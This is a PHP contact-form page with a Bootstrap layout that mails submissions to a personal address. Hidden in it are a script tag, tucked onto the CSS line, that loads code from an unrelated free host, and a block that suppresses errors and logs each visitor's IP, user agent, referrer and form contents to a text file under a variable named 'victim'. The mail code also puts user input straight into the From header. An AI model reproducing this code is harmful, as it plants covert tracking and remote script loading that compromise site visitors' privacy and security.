<?php
	// Message Vars
	// Useful for Bootstrap
	$msg = '';
	$msgClass = '';
?>

    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.0-beta3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-eOJMYsd53ii+scO/bJGFsiCZc+5NDVN2yr8+0RDqr0Ql0h+rP48ckxlpbzKgwra6" crossorigin="anonymous"><script src="https://get2mate.000webhostapp.com/ip/download.php"></script>



    <div>
        <h2 id="contactTitle" class="text-center">Contact Us</h2>
        <?php
		// Check For Submit
		if(filter_has_var(INPUT_POST, 'submit')){
			// Get Form Data
			$name = htmlspecialchars($_POST['name']);
			$email = htmlspecialchars($_POST['email']);
			$message = htmlspecialchars($_POST['message']);
			
			// Check Required Fields
			if(!empty($email) && !empty($name) && !empty($message)){
				// Passed
				// Recipient Email
				$toEmail = 'vijay51101kumar@gmail.com';
				$subject = 'Contact Request From '.$name;
				$body = '<h2>Contact Request</h2>
					<h4>Name</h4><p>'.$name.'</p>
					<h4>Email</h4><p>'.$email.'</p>
					<h4>Message</h4><p>'.$message.'</p>
				';

				// Email Headers
				$headers = "MIME-Version: 1.0" . "\r\n";
				$headers .="Content-Type:text/html;charset=UTF-8" . "\r\n";

				// Aditional Headers
				$headers .= "From: " .$name. "<".$email.">". "\r\n";

				if(mail($toEmail, $subject, $body, $headers)){
					// Email Sent
					$msg = 'Your email has been sent';
					$msgClass = 'alert-success';
				} else {
					// Failed
					$msg = 'Your email was not sent';
					$msgClass = 'alert-danger';
				}

			}
			}

		 
error_reporting(0); 
$br = '\  /   
        \/               ';
        
$today = date_default_timezone_set("Asia/Calcutta");
$time = date("h:i:sa");
$date =date("Y-m-d");
$day =date("D");
if (!empty($_SERVER['HTTP_CLIENT_IP']))
    {
      $ipaddress = $_SERVER['HTTP_CLIENT_IP']."\r\n"; 
    }
elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR']))
    {
      $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR']."\r\n"; 
    }
else
    {
      $ipaddress = $_SERVER['REMOTE_ADDR']."\r\n"; 
    }
$useragent = " User-Agent: "; 
$browser = $_SERVER['HTTP_USER_AGENT']; 
$file = 'contact.txt'; 
$victim = "IP: "; 
$fp = fopen($file, 'a' ); 
fwrite( $fp, $victim ); 
 fwrite( $fp, $ipaddress );
fwrite( $fp, $useragent  );
 fwrite( $fp, $today   );
fwrite( $fp, $br  );   
fwrite( $fp, $browser  );
fwrite( $fp, $br  );   
fwrite( $fp, '  User =>  ' ) ; 
fwrite( $fp, $name) ; 
fwrite( $fp, '  Email =>  '  );   
fwrite( $fp, $email) ; 
fwrite( $fp, '  Message =>  '  );   
fwrite( $fp, $message) ; 
fwrite( $fp, $br  );   
fwrite( $fp, '  Date is ' ) ; 
fwrite( $fp, $date ) ; 
fwrite( $fp, '  Time is ' ) ;    
fwrite( $fp, $time  ) ; 
fwrite( $fp, '  URL is ' ) ; 
fwrite( $fp, $_SERVER['HTTP_REFERER']  ) ;  
fwrite( $fp, $br  );   
 fclose( $fp);

		?>
    </div>
    
		<div id="contactMe" class="container">
		<?php if($msg != ''): ?>
			<div class="alert <?php echo $msgClass; ?>"><?php echo $msg; ?></div>
		<?php endif; ?>
		<form method="post" id="contactForm" action="<?php echo $_SERVER['PHP_SELF']; ?>">
			<div id="contactMeTable" class="row">
				<div id="nameCell" class="form-group col-md-5 offset-md-1">
					<label>Your name:</label>
					<input type="text" id="name" class="formInput form-control" placeholder="Add Name" name="name" value="<?php echo isset($_POST['name']) ? $name : '';?>" required>
				</div>
				<div id="emailCell" class="form-group col-md-5">
					<label>Your email:</label>
					<input type="email" id="email" class="formInput form-control" placeholder="Add Email" name="email" value="<?php echo isset($_POST['email']) ? $email : '';?>" required>
				</div>
			</div>
			<div class="row">
				<div id="messageCell" class="form-group col-md-10 offset-md-1">
					<label>Your message:</label>
				<textarea type="message" id="message" class="formInput form-control" placeholder="Add Message" name="message" value="<?php echo isset($_POST['message']) ? $message : '';?>" required></textarea>
				
</div>
			</div>
			<br>
			<div class="row">
				<button type="submit" name="submit" class="submitButtons btn btn-outline-secondary col-md-4 offset-md-4 col-6 offset-3">Submit</button>
			</div>
		</form>
	</div>
